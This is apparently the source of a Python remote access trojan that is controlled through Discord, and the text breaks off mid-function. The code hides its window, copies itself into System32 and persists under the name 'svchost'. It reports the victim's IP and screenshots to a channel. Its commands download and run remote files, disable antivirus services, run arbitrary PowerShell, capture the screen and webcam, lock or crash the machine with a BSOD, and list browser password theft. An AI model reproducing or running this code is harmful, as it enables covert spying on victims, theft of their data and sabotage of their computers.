import discord
from discord.ext import commands
import os
import pyautogui
import requests
import subprocess
import sys
import ctypes
import shutil
import winreg
import socket
import platform
import psutil
import time
import threading
import tkinter as tk
import asyncio
import webbrowser
import GPUtil
import cv2
import numpy as np
import getpass
import tkinter as tk
import re
from tkinter import *
import tkinter as tk
import tkinter.messagebox as messagebox
from functools import partial
import keyboard
from threading import Thread
import pygame
import tempfile
from io import BytesIO
from PIL import Image
import threading
import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from discord import Embed
from win32crypt import CryptUnprotectData
from discord.ext import commands
from discord import Intents
from pynput import mouse
import uuid
import socket
import cgi
import win32com.client
import traceback
from PIL import ImageGrab
import win32crypt
import pycaw
from mss import mss
import random
import pyaudio
from discord.opus import Encoder
import sqlite3
from datetime import datetime, timedelta
from getpass import getuser
from shutil import copy2
from win32com.client import Dispatch

def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

shine = "PUT_YOUR_DISCORD_TOKEN HERE"
GUILD_ID = PUT_YOUR_GUILD_ID_HERE
ALLOWED_CHANNELS = {}
PC_CHANNELS = {}
LAST_EMBED_MESSAGE_ID = None

# Hide the console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)


def is_connected():
    """Check if the device is connected to the internet."""
    try:
        # Try to connect to Google's DNS server
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False

async def wait_for_connection():
    """Wait until the device is connected to the internet."""
    print("Waiting for internet connection...")
    while not is_connected():
        await asyncio.sleep(5)  # Check every 5 seconds
    print("Internet connection restored!")

@bot.event
async def on_ready():
    print(f'Bot is connected as {bot.user}')
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)

    pc_name = os.environ['COMPUTERNAME']

    if not is_connected():
        await wait_for_connection()  # Wait until connected

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Hide the console window
hide_console()

def move_to_sys32(script_path):
    try:
        # Get the System32 path (Windows directory)
        sys32_path = os.path.join(os.environ['WINDIR'], 'System32')
        
        # Define the new path for the script in System32
        script_name = os.path.basename(script_path)
        new_script_path = os.path.join(sys32_path, script_name)
        
        # Move the script to System32
        shutil.move(script_path, new_script_path)
        
        print(f"Script successfully moved to {new_script_path}")
        return new_script_path
    except Exception as e:
        print(f"Error moving script to System32: {traceback.format_exc()}")
        return None

def add_to_schtask(script_path):
    # Create a scheduled task for startup (no admin privileges required)
    try:
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()

        root_folder = scheduler.GetFolder("\\")
        task_definition = scheduler.NewTask(0)

        # Set basic task information
        task_definition.RegistrationInfo.Description = "Startup Task for svchost"
        task_definition.Principal.UserId = ""  # Use the current user
        task_definition.Principal.LogonType = 3  # Interactive logon
        task_definition.Principal.RunLevel = 0  # Run with normal privileges

        # Define a logon trigger
        trigger = task_definition.Triggers.Create(1)  # 1 = Logon Trigger
        trigger.StartBoundary = datetime.now().isoformat()  # Immediate start

        # Define the action to run the script
        action = task_definition.Actions.Create(0)  # 0 = Execute Action
        action.Path = sys.executable  # Python executable
        action.Arguments = f'"{script_path}"'

        # Configure task settings
        task_definition.Settings.Enabled = True
        task_definition.Settings.AllowStartIfOnBatteries = True
        task_definition.Settings.StopIfGoingOnBatteries = False
        task_definition.Settings.Hidden = True

        # Register the task
        task_name = "svchost"
        root_folder.RegisterTaskDefinition(task_name, task_definition, 6, None, None, 3)
        print(f"Scheduled task '{task_name}' created successfully.")
    except Exception as e:
        print(f"Error creating scheduled task: {traceback.format_exc()}")

def add_to_registry(script_path):
    try:
        # Access the registry key for startup
        registry_key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        # Open the registry key
        with winreg.OpenKey(registry_key, key_path, 0, winreg.KEY_WRITE) as registry:
            # Add the script to the registry to run on startup
            winreg.SetValueEx(registry, "svchost", 0, winreg.REG_SZ, script_path)
        
        print(f"Script successfully added to registry for startup.")
    except Exception as e:
        print(f"Error adding script to registry: {traceback.format_exc()}")

def add_startup_entries():
    try:
        # Use the current script path
        script_path = os.path.realpath(sys.argv[0])

        # Move the script to System32
        new_script_path = move_to_sys32(script_path)
        if new_script_path:
            # Add to scheduled tasks
            add_to_schtask(new_script_path)
            # Add to registry for startup
            add_to_registry(new_script_path)
    except Exception as e:
        print(f"Error in adding startup entries: {e}")
    
def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        ip_address = data.get('ip')
        country_code = data.get('country')
        return ip_address, country_code
    except Exception as e:
        return None, None

# Function to get PC information
def get_pc_info():
    cpu = platform.processor()
    ram = round(psutil.virtual_memory().total / (1024 ** 3))
    return f"CPU: {cpu}\nRAM: {ram} GB"

# Country flags dictionary
country_flags = {
    'US': '🇺🇸',
    'CA': '🇨🇦',
    'GB': '🇬🇧',
    'DE': '🇩🇪',
    'FR': '🇫🇷',
    'IT': '🇮🇹',
    'JP': '🇯🇵',
    'IN': '🇮🇳',
    'AR': '🇦🇷',
    'AU': '🇦🇺',
    'CN': '🇨🇳',
    'CZ': '🇨🇿',
    'DK': '🇩🇰',
}

@bot.check
async def check_channel(ctx):
    allowed_channel_id = ALLOWED_CHANNELS.get(ctx.guild.id)
    return allowed_channel_id is None or ctx.channel.id == allowed_channel_id

@bot.event
async def on_ready():
    print(f'Bot is connected as {bot.user}')
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)

    pc_name = os.environ['COMPUTERNAME']
    ip_address, country_code = get_ip_info()
    country_flag = country_flags.get(country_code, '') if country_code else '🏳️'  # Default to a white flag if no code

    # Get GPU information
    gpus = GPUtil.getGPUs()
    gpu_info = ""
    if gpus:
        for gpu in gpus:
            gpu_info += f"**{gpu.name}** - Memory: {gpu.memoryTotal}MB (Free: {gpu.memoryFree}MB, Used: {gpu.memoryUsed}MB)\n"
    else:
        gpu_info = "No GPU found."

    if pc_name not in PC_CHANNELS:
        # Create a new text channel for the PC if it doesn't already exist
        channel = await guild.create_text_channel(name=f'session-{pc_name}')
        PC_CHANNELS[pc_name] = channel.id
        ALLOWED_CHANNELS[guild.id] = channel.id

        # Capture a screenshot
        screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        # Create the embed message with PC details
        embed = discord.Embed(color=11075803)
        embed.add_field(name="🖥️ PC-NAME", value=pc_name, inline=False)
        embed.add_field(name="ℹ️ PC INFO", value=get_pc_info(), inline=False)
        embed.add_field(name="🌐 IP", value=ip_address, inline=False)
        embed.add_field(name="🌍 COUNTRY", value=f"{country_flag} {country_code}", inline=False)
        embed.add_field(name="🎮 GPU INFO", value=gpu_info, inline=False)
        embed.set_image(url="attachment://screenshot.png")  # Set the image inside the embed

        # Send the embed and screenshot to the new channel
        message = await channel.send(embed=embed, file=discord.File(screenshot_path, 'screenshot.png'))

        # Store the ID of the embed message
        global LAST_EMBED_MESSAGE_ID
        LAST_EMBED_MESSAGE_ID = message.id

        # Notify users of the new session
        await channel.send("@here A new session has been created for PC: " + pc_name)
    else:
        ALLOWED_CHANNELS[guild.id] = PC_CHANNELS[pc_name]

@bot.command()
async def ss(ctx):
    print("Screenshot command received!")

    # Capture screenshots of all monitors
    with mss() as sct:
        monitors = sct.monitors[1:]  # Skip the first entry; it's the "all monitors" entry
        screenshots_paths = []

        for index, monitor in enumerate(monitors):
            screenshot_path = os.path.join(os.getenv('TEMP'), f'screenshot_monitor_{index + 1}.png')
            sct_img = sct.grab(monitor)
            
            # Convert the raw screenshot to a proper image file
            img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
            img.save(screenshot_path)
            screenshots_paths.append(screenshot_path)

    try:
        # Create an embed for each screenshot
        for index, screenshot_path in enumerate(screenshots_paths):
            file = discord.File(screenshot_path, filename=os.path.basename(screenshot_path))
            
            # Embed with the screenshot as an image
            embed = discord.Embed(
                title=f"Screenshot Monitor {index + 1}",
                color=0xa900db
            )
            embed.set_image(url=f"attachment://{os.path.basename(screenshot_path)}")

            # Send the embed with the file
            await ctx.send(embed=embed, file=file)

    finally:
        # Clean up temporary files
        for screenshot_path in screenshots_paths:
            if os.path.exists(screenshot_path):
                os.remove(screenshot_path)

@bot.command()
async def clear(ctx, amount: int = 100):
    print("Clear command received!")
    if LAST_EMBED_MESSAGE_ID is not None:
        def check(msg):
            return msg.id != LAST_EMBED_MESSAGE_ID and msg.channel == ctx.channel

        deleted = await ctx.channel.purge(limit=amount, check=check)
        await ctx.send(f"Deleted {len(deleted)} messages.", delete_after=5)

@bot.command()
async def execute(ctx, url: str):
    print("Execute command received!")
    temp_path = os.path.join(os.getenv('TEMP'), 'svchost.exe')

    # Check if the file already exists and delete it
    if os.path.exists(temp_path):
        os.remove(temp_path)
        print("Old downloaded file deleted.")

    # Download the new file
    try:
        response = requests.get(url, allow_redirects=True)
        response.raise_for_status()  # Raise an error for bad responses

        with open(temp_path, 'wb') as f:
            f.write(response.content)
            print("New file downloaded.")

        # Set file attributes to hide it
        ctypes.windll.kernel32.SetFileAttributesW(temp_path, 2)
        
        # Execute the downloaded file
        subprocess.Popen(temp_path, shell=True)
        
        # Send feedback to the Discord channel
        await ctx.send(f"Downloaded and executed: {temp_path}")
    except Exception as e:
        print(f"An error occurred: {e}")
        await ctx.send(f"Failed to download or execute the file: {e}")

@bot.command()
async def av(ctx):
    print("Attempting to disable antivirus software...")

    # Check if the bot is running with admin privileges
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("Please run this command with admin privileges.")
        return

    try:
        # Disable Windows Defender
        await ctx.send("Disabling Windows Defender...")
        subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name WinDefend -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Windows Defender Real-Time Protection Disabled.")

        # Disable Bitdefender
        await ctx.send("Disabling Bitdefender...")
        subprocess.run(['powershell', '-Command', "Stop-Service -Name 'Bitdefender Endpoint Security' -Force"], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', "Stop-Service -Name 'Bitdefender Threat Scanner' -Force"], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', "Stop-Service -Name 'Bitdefender Active Virus Control' -Force"], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', "Stop-Service -Name 'Bitdefender Device Management Service' -Force"], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', "Set-Service -Name 'Bitdefender Endpoint Security' -StartupType Disabled"], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Bitdefender Disabled.")

        # Disable Malwarebytes
        await ctx.send("Disabling Malwarebytes...")
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name MBAMService -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name MBAMScheduler -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Malwarebytes Disabled.")

        # Disable Avast
        await ctx.send("Disabling Avast...")
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name AvastSvc -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name AvastFirewall -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name AvastWebShield -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name AvastMailShield -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-Service -Name AvastSvc -StartupType Disabled'], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Avast Disabled.")

        # Disable Norton
        await ctx.send("Disabling Norton Antivirus...")
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name "Norton AntiVirus" -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name "Norton Security" -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Stop-Service -Name "Norton Firewall" -Force'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-Service -Name "Norton AntiVirus" -StartupType Disabled'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-Service -Name "Norton Security" -StartupType Disabled'], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run(['powershell', '-Command', 'Set-Service -Name "Norton Firewall" -StartupType Disabled'], creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send("Norton Antivirus Disabled.")

    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")


@bot.command()
async def status(ctx):
    print("Clients command received!")
    await ctx.send("Session Status Active: " + ', '.join(PC_CHANNELS.keys()))

@bot.command()
async def rename(ctx, new_name: str):
    try:
        # Get the current script path
        current_script = sys.argv[0]

        # Determine if the current script is an .exe or .py
        is_executable = current_script.lower().endswith('.exe')
        
        # Ensure the new name has the correct extension
        if is_executable:
            if not new_name.endswith(".exe"):
                new_name += ".exe"
        else:
            if not new_name.endswith(".py"):
                new_name += ".py"
        
        # Define the new file path with the desired name
        new_file_path = os.path.join(os.path.dirname(current_script), new_name)
        
        # Copy the current script to the new file path
        shutil.copy2(current_script, new_file_path)
        
        # Start the renamed script as a new process
        if is_executable:
            subprocess.Popen([new_file_path] + sys.argv[1:])  # Start the new .exe
        else:
            subprocess.Popen([sys.executable, new_file_path] + sys.argv[1:])  # Start the new .py

        # Inform the user about the rename and restart
        await ctx.send(f"Bot is restarting with the new name: `{new_name}`")
        
        # Exit the current process to complete the restart
        await bot.close()
        sys.exit()

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def commands(ctx):
    print("Help command received!")
    
    embed1 = discord.Embed(title="Help (Part 1)", color=0xa900db)
    embed1.add_field(name="📷 .ss", value="Take a screenshot and send it.", inline=False)
    embed1.add_field(name="🗑️ .clear [amount]", value="Clear the last [amount] messages in the channel.", inline=False)
    embed1.add_field(name="💻 .execute [url]", value="Download and execute a file from a given URL.", inline=False)
    embed1.add_field(name="🔑 .admin", value="Restart the bot with admin privileges.", inline=False)
    embed1.add_field(name="🛡️ .av", value="Disable Windows Defender and other antivirus software.", inline=False)
    embed1.add_field(name="👥 .status", value="Checks if the pc is still connected.", inline=False)
    embed1.add_field(name="🔒 .shutdown", value="Shutdown the PC.", inline=False)
    embed1.add_field(name="🔄 .restart", value="Restart the PC.", inline=False)
    await ctx.send(embed=embed1)
    
    embed2 = discord.Embed(title="Help (Part 2)", color=0xa900db)
    embed2.add_field(name="❄️ .rename [newname.exe]", value="Rename the Process.", inline=False)
    embed2.add_field(name="🌐 .website", value="Redirect to a website.", inline=False)
    embed2.add_field(name="▶️ .sr", value="Start screen recording", inline=False)
    embed2.add_field(name="💌 .powershell [command]", value="command powershell.", inline=False)
    embed2.add_field(name="📂 .directory", value="shows where its directory is.", inline=False)
    embed2.add_field(name="🔥 .token", value="Get the Token🤑", inline=False)
    embed2.add_field(name="💀 .bsod", value="Trigger a Blue Screen of Death (BSOD)", inline=False)
    embed2.add_field(name="🔒 .lock [number]", value="Lock the PC.", inline=False)
    embed2.add_field(name="🔓 .unlock [number]", value="Unlock the PC.", inline=False)
    embed2.add_field(name="🚫 .block-input", value="Block all keyboard and mouse input.", inline=False)
    embed2.add_field(name="⭕ .unblock-input", value="UnBlock The keyboard and mouse that is blocked.", inline=False)
    embed2.add_field(name="💬 .tts [text]", value="Play a tts speech.", inline=False)
    embed2.add_field(name="🌀 .processes", value="Show running processes.", inline=False)
    embed2.add_field(name="❌ .kill [process]", value="Kill a process.", inline=False)
    embed2.add_field(name="🔉 .play [attachment]", value="Play Audio through attaching the file.", inline=False)
    embed2.add_field(name="😵 .monitors-off", value="Turn off Monitor", inline=False)
    embed2.add_field(name="😃 .monitors-on", value="Turn on monitor", inline=False)
    embed2.add_field(name="🍴 .forkbomb", value="FORBOMB BOMB  YOUR PC.", inline=False)
    embed2.add_field(name="❌ .remove", value="Removes itself leave no trace.", inline=False)
    embed2.add_field(name="📸 .webcam", value="Takes picture of the webcam.", inline=False)
    embed2.add_field(name="🟢 .reagentcenable", value="Enables back factory reset.", inline=False)
    embed2.add_field(name="🔴 .reagentcdisable", value="Disables factory reset.", inline=False)
    embed2.add_field(name="📩 .block-website [website_url]", value="blocks the website.", inline=False)
    embed2.add_field(name="☠️ .jumpscare", value="Goes and jumpscapres you.", inline=False)
    await ctx.send(embed=embed2)

    embed3 = discord.Embed(title="Help (Part 3): Troll Commands", color=0xa900db)
    embed3.add_field(name="🧱 .wallpaper [attachment]", value="Changes the PC's wallpaper with the image/attachment.", inline=False)
    embed3.add_field(name="🧪 .message [text]", value="Shows a message box with your text.", inline=False)
    embed3.add_field(name="🐭 .trollmouse", value="Moves the mouse randomly and quickly across the screen.", inline=False)
    embed3.add_field(name="⌨️ .trollkeyboard", value="Types random characters on the keyboard.", inline=False)
    embed3.add_field(name="⛔ .trollstop", value="Stops all troll actions.", inline=False)
    embed3.add_field(name="🔒 .disabletaskmanager", value="Permanently disables Task Manager.", inline=False)
    embed3.add_field(name="🔓 .enabletaskmanager", value="Re-enables Task Manager.", inline=False)
    embed3.add_field(name="🚫 .blockavsite", value="Blocks antivirus, process monitors, and system informer websites.", inline=False)
    embed3.add_field(name="🎤 .miclist", value="List available microphones for audio streaming.", inline=False)
    embed3.add_field(name="🎙️ .micuse [mic name]", value="Select a specific microphone for audio streaming.", inline=False)
    embed3.add_field(name="🔊 .mic [voice_channel_id]", value="Join a voice channel and stream audio from the selected microphone.", inline=False)
    embed3.add_field(name="🌳 .rootkit", value="Hides from task manager.", inline=False)
    embed3.add_field(name="🔑 .grabpass", value="Grabs the passwords from browsers.", inline=False)
    embed3.add_field(name="🛜 .grabwifi", value="Grabs the Wifi password and username.", inline=False)
    embed3.add_field(name="💻 .startup", value="show which adds to startups method.", inline=False)
    embed3.add_field(name="💻 .addstartup [which method]", value="adds to startup of which u picked", inline=False)
    await ctx.send(embed=embed3)



# Global variables
block_input_active = False
mouse_listener = None

# Define a function to block all keyboard and mouse input
def block_input():
    global block_input_active
    global mouse_listener

    block_input_active = True

    # Block keyboard input
    while block_input_active:
        keyboard.block_key("all")  # Block all keyboard keys
        time.sleep(0.1)  # Small delay to prevent high CPU usage

    # Stop mouse listener when blocking is inactive
    if mouse_listener:
        mouse_listener.stop()

def on_move(x, y):
    # Prevent mouse movements
    return False  # Returning False stops the listener

def on_click(x, y, button, pressed):
    # Prevent mouse clicks
    return False  # Returning False stops the listener

def on_scroll(x, y, dx, dy):
    # Prevent mouse scrolling
    return False  # Returning False stops the listener

@bot.command(name="block-input")
async def block_input_command(ctx):
    global block_input_active
    global mouse_listener
    
    if block_input_active:
        await ctx.send("Input is already blocked.")
        return

    await ctx.send("Blocking all keyboard and mouse input...")
    
    # Start blocking input in a separate thread
    thread = threading.Thread(target=block_input)
    thread.daemon = True
    thread.start()
    
    # Start mouse listener to block mouse input
    mouse_listener = mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll
    )
    mouse_listener.start()

@bot.command(name="unblock-input")
async def unblock_input_command(ctx):
    global block_input_active
    
    if not block_input_active:
        await ctx.send("Input is not currently blocked.")
        return

    # Set the flag to False, stopping the block_input loop
    block_input_active = False
    keyboard.unhook_all()  # Unblocks all keys immediately

    # Stop mouse listener
    if mouse_listener:
        mouse_listener.stop()
    
    await ctx.send("Keyboard and mouse input unblocked.")

@bot.command()
async def shutdown(ctx):
    print("Shutdown command received!")
    await ctx.send("Shutting down the PC...")
    os.system("shutdown /s /t 1")

@bot.command()
async def restart(ctx):
    print("Restart command received!")
    await ctx.send("Restarting the PC...")
    os.system("shutdown /r /t 1")

@bot.command()
async def website(ctx, url: str):
    print(f"Opening website: {url}")
    webbrowser.open(url)
    await ctx.send(f"Opening website: {url}")

@bot.command()
async def sr(ctx, duration: int = 30):  # Default duration is set to 30 seconds
    # Input validation
    if duration <= 0:
        await ctx.send("Duration must be a positive integer.")
        return

    await ctx.send(f"Starting screen recording for {duration} seconds...")

    # Fixed parameters
    frame_rate = 20.0
    screen_size = pyautogui.size()

    # Define video writer for recording in mp4 format (or MOV if desired)
    video_path = os.path.join(os.getenv('TEMP'), 'screen_record.mp4')  # Using .mp4 for compatibility
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")  # Using mp4 codec, for better compatibility
    out = cv2.VideoWriter(video_path, fourcc, frame_rate, screen_size)

    # Start recording the screen
    start_time = time.time()
    while time.time() - start_time < duration:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    # Release the video writer
    out.release()

    # Send feedback that recording has finished
    await ctx.send("Screen recording finished. Sending the video...")

    # Send the video file to the Discord channel
    with open(video_path, 'rb') as f:
        await ctx.send("Here is the screen recording:", file=discord.File(f, 'screen_record.mp4'))

    # Optionally, delete the video file after sending
    os.remove(video_path)

@bot.command()
async def powershell(ctx, *, command: str):
    # Construct the PowerShell command to execute in the background
    ps_command = f"$ErrorActionPreference = 'Stop'; {command}"
    
    # Run PowerShell in hidden mode
    process = subprocess.Popen(
        ["powershell", "-Command", ps_command],
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    # Wait for a moment to let the command execute (adjust as necessary)
    time.sleep(2)

    # Check for errors and output
    stdout, stderr = process.communicate()
    if stderr:
        await ctx.send(f"Error:\n```\n{stderr.strip()}\n```")
    else:
        await ctx.send(f"Output:\n```\n{stdout.strip()}\n```")

@bot.command()
async def directory(ctx):
    current_directory = os.getcwd()  # Get the current working directory
    await ctx.send(f"The current directory is: {current_directory}")

default_password = "123"
lock_text = "Windows is locked. Enter the password to unlock."
count = 3
lock_window = None
current_password = default_password  # Stores the current password


def start_lock_window(password):
    """Function to create and display the lock window."""
    global lock_window
    lock_window = Tk()
    lock_window.title("SOULOCKED")
    lock_window["bg"] = "black"
    
    Label(lock_window, bg="black", fg="pink", text="WINDOWS LOCKED BY SOULOCKED\n\n\n", font="helvetica 75").pack()
    Label(lock_window, bg="black", fg="pink", text=lock_text, font="helvetica 40").pack(side=TOP)

    enter_pass = Entry(lock_window, bg="black", fg="pink", font="helvetica 35")
    enter_pass.pack()
    lock_window.resizable(0, 0)

    lock_window.lift()
    lock_window.attributes('-topmost', True)
    lock_window.attributes('-fullscreen', True)

    Button(lock_window, text='Unlock', padx="31", pady="19", bg='black', fg='pink', font="helvetica 30", 
           command=lambda: check_password(enter_pass.get(), password)).pack()

    for i in range(10):
        Button(lock_window, text=str(i), padx="28", pady="19", bg='black', fg='pink', font="helvetica 25", 
               command=partial(lambda x=str(i): enter_pass.insert(END, x))).pack(side=LEFT)

    Button(lock_window, text='<', padx="28", pady="19", bg='black', fg='pink', font="helvetica 25", 
           command=lambda: enter_pass.delete(-1, END)).pack(side=LEFT)

    lock_window.protocol("WM_DELETE_WINDOW", lambda: messagebox.showwarning("SOULOCKED", "Cannot close the lock window!"))
    lock_window.mainloop()

def check_password(entered_password, password):
    """Check if the entered password matches the stored password."""
    global count
    if entered_password == password:
        messagebox.showinfo("SOULOCKED", "UNLOCKED SUCCESSFULLY")
        lock_window.destroy()  # Close the lock window
    else:
        count -= 1
        if count <= 0:
            messagebox.showwarning("SOULOCKED", "Number of attempts expired.")
            bsod()  # Trigger BSOD function (assuming you have this defined elsewhere)
        else:
            messagebox.showwarning("SOULOCKED", f"Wrong password. Available tries: {count}")


@bot.command()
async def lock(ctx, *, password: str = default_password):
    """Lock the screen with a password."""
    global current_password
    current_password = password  # Update the current password
    await ctx.send(f"Locking the screen with password: {password}")
    start_lock_window(current_password)

@bot.command()
async def unlock(ctx, *, password: str):
    """Unlock the screen with the provided password."""
    if lock_window:
        check_password(password, current_password)  # Check password against the current password
        await ctx.send("Unlock command executed.")
    else:
        await ctx.send("The screen is not locked.")

@bot.command()
async def bsod(ctx):
    """Trigger a real Blue Screen of Death (BSOD)."""
    await ctx.send("WARNING: Triggering BSOD... Your system will crash immediately!")

    try:
        # Adjust privileges
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))

        # Trigger the BSOD
        ctypes.windll.ntdll.NtRaiseHardError(
            0xC0000022,  # Status code: Access Denied
            0,           # Number of arguments
            0,           # Arguments (None)
            0,           # Reserved
            6,           # Option: Shutdown the system
            ctypes.byref(ctypes.c_ulong())
        )
    except Exception as e:
        await ctx.send(f"Failed to trigger BSOD: {e}")

@bot.command()
async def processes(ctx):
    # Get all running process names
    process_list = [proc.name() for proc in psutil.process_iter()]
    
    # Split the list into chunks to fit within Discord's message limit
    max_length = 2000 - 7  # Adjust for the code block formatting
    current_chunk = "```\n"  # Start with the code block opening

    for process in process_list:
        # Check if adding this process would exceed the max length
        if len(current_chunk) + len(process) + 1 > max_length:
            # Send the current chunk if it exceeds the limit
            current_chunk += "\n```"  # Close the code block before sending
            await ctx.send(current_chunk)  # Send the chunk
            current_chunk = "```\n" + process  # Start a new chunk with the current process
        else:
            # Add the process to the current chunk
            current_chunk += (process + "\n")

    # Send any remaining processes in the last chunk
    if current_chunk != "```\n":  # Ensure there's something to send
        current_chunk += "```"  # Close the code block
        await ctx.send(current_chunk)

# Dictionary to store blacklisted processes

@bot.command()
async def kill(ctx, process_name: str):
    """Kill a specified process by name."""
    killed = False
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == process_name:
            proc.terminate()
            killed = True
            await ctx.send(f"Process '{process_name}' has been terminated.")
            break
    
    if not killed:
        await ctx.send(f"No process named '{process_name}' found.")

# Initialize Pygame mixer
pygame.mixer.init()

@bot.command()
async def play(ctx, *, filename: str = None):
    if filename is None:
        # Handle attached file
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".mp3")
            await attachment.save(temp_file.name)
            temp_file.close()
            filename = temp_file.name  # Use the temporary file's name
        else:
            await ctx.send("No filename provided and no attachment found.")
            return
    else:
        # Check if the provided file exists
        if not os.path.isfile(filename):
            await ctx.send(f"File '{filename}' not found.")
            return

    try:
        # Play the file
        pygame.mixer.music.load(filename)
        pygame.mixer.music.play()
        await ctx.send(f"Playing '{filename}'...")
    except Exception as e:
        await ctx.send(f"An error occurred while trying to play the file: {e}")
    finally:
        # Clean up the temporary file
        if 'temp_file' in locals():
            os.remove(temp_file.name)

def turn_off_monitors():
    # This will turn off all monitors
    ctypes.windll.user32.SendMessageW(
        0xFFFF,  # HWND_BROADCAST
        0x112,   # WM_SYSCOMMAND
        0xF170,  # SC_MONITORPOWER
        2        # Turn off
    )

def turn_on_monitors():
    # This will turn on all monitors
    ctypes.windll.user32.SendMessageW(
        0xFFFF,  # HWND_BROADCAST
        0x112,   # WM_SYSCOMMAND
        0xF170,  # SC_MONITORPOWER
        -1       # Turn on
    )

@bot.command(name="monitors-off")
async def monitors_off(ctx):
    """Turn off all monitors."""
    turn_off_monitors()
    await ctx.send("All monitors have been turned off.")

@bot.command(name="monitors-on")
async def monitors_on(ctx):
    """Turn on all monitors."""
    turn_on_monitors()
    await ctx.send("All monitors have been turned on.")

def spam_apps():
    """Continuously open CMD and Calculator until stopped."""
    while True:
        subprocess.Popen("cmd.exe")  # Open Command Prompt
        subprocess.Popen("calc.exe")  # Open Calculator
        time.sleep(0.1)  # Small delay to prevent freezing (adjust as necessary)

@bot.command(name="forkbomb")
async def forkbomb(ctx):
    """Start the forkbomb that opens CMD and Calculator repeatedly."""
    await ctx.send("Spamming Forkbomb.")
    
    # Start the spamming in a separate thread to avoid blocking the bot
    thread = threading.Thread(target=spam_apps)
    thread.daemon = True  # This allows the thread to exit when the main program exits
    thread.start()

@bot.command()
async def remove(ctx):
    """Completely removes the bot file from the system with no trace."""
    try:
        await ctx.send("Bot is being permanently removed from this machine. Goodbye!")

        # Get the path to the current bot file
        bot_file = sys.argv[0]

        # Close the bot before removing the file
        await bot.close()

        # Attempt to delete the bot file
        os.remove(bot_file)

        # Overwrite the file location with garbage data to ensure no recovery
        with open(bot_file, 'wb') as f:
            f.write(os.urandom(1024))  # Overwrite with random bytes

        # Finally, remove itself and exit
        os.remove(bot_file)
        print(f"{bot_file} has been securely removed.")
        os._exit(0)  # Exit the process
    except Exception as e:
        print(f"Error removing bot: {e}")

@bot.command()
async def webcam(ctx):
    """Capture an image from the webcam and send it to Discord."""
    try:
        # Open webcam
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            await ctx.send("Could not access the webcam.")
            return
        
        # Read a frame from the webcam
        ret, frame = cam.read()
        cam.release()

        if not ret:
            await ctx.send("Failed to capture image.")
            return

        # Save the image to %temp% directory
        temp_dir = tempfile.gettempdir()
        image_path = os.path.join(temp_dir, "webcam_image.jpg")
        cv2.imwrite(image_path, frame)

        # Send the image to Discord
        with open(image_path, "rb") as image_file:
            await ctx.send("Here is the captured image:", file=discord.File(image_file))

        # Remove the image after sending
        os.remove(image_path)

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
        
@bot.command()
async def reagentcenable(ctx):
    """Enables the factory reset option by enabling WinRE (both from Settings and on boot)."""
